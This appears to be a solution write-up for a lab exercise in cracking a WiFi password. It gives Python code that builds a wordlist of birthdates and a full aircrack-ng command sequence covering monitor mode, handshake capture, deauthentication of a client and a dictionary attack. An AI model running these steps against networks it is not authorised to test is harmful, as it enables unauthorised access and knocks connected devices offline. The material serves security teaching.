### Solution for Lab 1 - Crack WiFi Passwords - 
-----------
There's 2 parts to this Lab. The first one is creating a wordlist and then running the wordlist to crack the password.
The password is a birthdate (the format of which we do not know)
------------
### Generating the wordlist

The python script that generates the scripts can be found [here](wordlist_generator.ipynb)
```
from datetime import datetime, timedelta

# Define the start and end dates for the range
start_date = datetime(1920, 1, 1)
end_date = datetime(2024, 12, 31)

with open("dates_1920_2024_wordlist.txt", "w") as file:
    current_date = start_date
    while current_date <= end_date:
        # Write the  date to the file in DDMMYYYY format
        file.write(current_date.strftime('%d%m%Y') + "\n")
        # Move to the next day
        current_date += timedelta(days=1)

    # Reset the current_date to start_date for MMDDYYYY format
    current_date = start_date
    # Now append the MMDDYYYY formatted dates
    while current_date <= end_date:
        # Write the date to the file in MMDDYYYY format
        file.write(current_date.strftime('%m%d%Y') + "\n")
        current_date += timedelta(days=1)

print("Wordlist for DDMMYYYY and MMDDYYYY formats generated successfully.")
```
### Removing the duplicates
```
# Path to your file
file_path = "dates_1920_2024_wordlist.txt"

# Read the file and remove duplicates
with open(file_path, 'r') as file:
    unique_lines = set(file.readlines())

# Write the unique lines back to the file
with open(file_path, 'w') as file:
    file.writelines(unique_lines)

print("Duplicates removed successfully.")
```

------------
### Cracking the Password

First install aircrack-ng suite and then run the following:


History of commands for cracking the password 
```
iwconfig
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng start wlx00117f1bf909
iwconfig wlan0mon
sudo airodump-ng wlan0mon
sudo airodump-ng --channel 3 --bssid A8:F7:E0:06:1E:4E --write hackMewifi  wlan0mon
sudo aireplay-ng --deauth 5 -a A8:F7:E0:06:1E:4E -c B2:4B:41:C2:D1:19  wlan0mon
aircrack-ng hackMewifi-01.cap -w dates_1920_2024_wordlist.txt
sudo systemctl restart NetworkManager
```
